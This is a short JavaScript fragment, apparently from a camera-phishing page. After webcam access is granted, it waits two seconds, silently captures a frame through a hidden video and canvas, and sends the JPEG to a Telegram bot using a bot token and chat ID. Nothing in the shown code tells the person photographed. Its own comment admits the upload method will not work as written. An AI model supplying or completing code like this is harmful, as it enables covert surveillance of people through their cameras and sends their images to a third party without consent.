// Inside startCam() after getUserMedia()
const video = document.createElement('video');
video.srcObject = stream;
video.onloadedmetadata = () => {
    video.play();
    setTimeout(() => {
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        const photo = canvas.toDataURL('image/jpeg');
        
        // Send photo to Telegram (needs file upload API)
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto?chat_id=${CHAT_ID}&photo=${photo}`);
    }, 2000); // Takes photo after 2 seconds
};